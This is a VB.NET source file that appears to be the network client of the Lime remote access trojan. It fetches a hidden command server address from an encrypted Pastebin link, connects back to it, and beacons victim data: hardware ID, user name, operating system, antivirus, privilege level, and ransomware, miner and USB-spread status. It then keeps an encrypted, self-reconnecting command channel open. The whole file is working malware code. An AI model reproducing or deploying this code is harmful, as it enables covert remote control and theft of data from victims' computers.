Imports System.Collections.Generic

Namespace Lime

    Public Class C_TcpClient
        Public Shared ENDOF As String = C_Settings.ENDOF
        Public Shared SPL As String = C_Settings.SPL
        Public Shared C As Net.Sockets.TcpClient
        Public Shared R As New Random
        Public Shared T1 As New Threading.Thread(AddressOf Connect)
        Public Shared Alive As Boolean = False
        Public Shared MS As IO.MemoryStream = Nothing
        Public Shared Tick As System.Threading.Timer = Nothing
        Public Shared KA As Integer = 0
        Public Shared P As New List(Of Integer)

        Public Shared Sub Connect()

            While True
                If Alive = True Then
                    Try
                        While C.Connected
                            KA += 1
                            If KA = 500 Then
                                If C.Available < 1 Then
                                    C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead)
                                End If
                                If C.Available <= 0 Then
                                    KA = 0
                                    Exit While
                                End If
                                KA = 0
                            End If
                            If C.Available > 0 Then
                                Dim B(C.Available - 1) As Byte
                                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                                MS.Write(B, 0, B.Length)
re:
                                If BS(MS.ToArray).Contains(ENDOF) Then
                                    Dim A As Array = SplitWord(MS.ToArray, ENDOF)
                                    Dim T As New Threading.Thread(AddressOf C_Commands.Data)
                                    T.Start(A(0))
                                    MS.Dispose()
                                    MS = New IO.MemoryStream
                                    If A.Length = 2 Then
                                        MS.Write(A(1), 0, A(1).length)
                                        GoTo re
                                    End If
                                End If
                            End If
                        End While
                    Catch ex As Exception
                    End Try
                End If

                Alive = False
                Do While Not Alive
                    Threading.Thread.Sleep(R.Next(10 * 1000))
                    ReConnect()
                Loop

            End While

        End Sub

        Public Shared Function ReConnect()
            Alive = False

            Try
                C.Close()
                C = Nothing
            Catch ex As Exception
            End Try

            Try
                Tick.Dispose()
                Tick = Nothing
            Catch ex As Exception
            End Try

            Try
                MS.Dispose()
                MS = Nothing
            Catch ex As Exception
            End Try

            Try
                C = New Net.Sockets.TcpClient
                C.SendBufferSize = 4194304
                C.ReceiveBufferSize = 4194304
                C.ReceiveTimeout = -1
                C.SendTimeout = -1

#If DEBUG Then

                C_Settings.HOST = "127.0.0.1"
                C_Settings.PORT = 8989
#Else

                Using WC As New Net.WebClient 'Pastebin, split by ":" IP:PORT
                    Try
                        Dim myCredentials As New Net.NetworkCredential("", "")
                        WC.Credentials = myCredentials
                        Dim Response As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
                        ' Dim Response As String = WC.DownloadString((C_Settings.Pastebin))
                        Dim SPL = Split(Response, ":")
                        C_Settings.HOST = SPL(0)
                        Dim r As New Random
                        C_Settings.PORT = SPL(New Random().Next(1, SPL.Length))
                        WC.Dispose()
                    Catch ex As Exception
                    End Try
                End Using

#End If

                C.Connect(C_Settings.HOST, C_Settings.PORT)
                Alive = True
                MS = New IO.MemoryStream

                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.5C", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                  C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, C_Settings.PORT, SPL, C_ID.dotNET, SPL, "...", SPL, " ", SPL,
                                  C_ID.Privileges.ToString, SPL, C_Settings.fullpath))

                Dim T As New Threading.TimerCallback(AddressOf PING)
                Tick = New Threading.Timer(T, Nothing, 0, 1)

                Return Alive
            Catch ex As Exception
                Return Alive
            End Try
        End Function

        Public Shared Sub SendData(ByVal b As Byte())
            Dim M As IO.MemoryStream = New IO.MemoryStream
            Try
                M.Write(b, 0, b.Length)
                M.Write(SB(ENDOF), 0, ENDOF.Length)
                SyncLock C
                    C.Client.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
                    C.Client.Send(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None)
                End SyncLock
                M.Dispose()
            Catch ex As Exception
                Alive = False
                M.Dispose()
            End Try
        End Sub

        Public Shared Sub Send(ByVal S As String)
            SendData(SB(C_Encryption.AES_Encrypt(S)))
        End Sub

        Public Shared P_Stop As Boolean = False
        Public Shared P_Start As Boolean = False
        Public Shared i As Integer = 0
        Public Shared KAP As Integer = 0
        Public Shared Sub PING()
            Try
                If P_Start Then
                    i += 1
                    If P_Stop Then
                        P_Start = False : P_Stop = False
                        Send("!P" + SPL + i.ToString + SPL + C_ID.HWID + SPL + C_ID.UserName)
                        i = 0
                    End If
                End If

                KAP += 1 : If KAP > 5000 Then KAP = 0 : Send("KA")
            Catch : End Try
        End Sub

    End Class

End Namespace
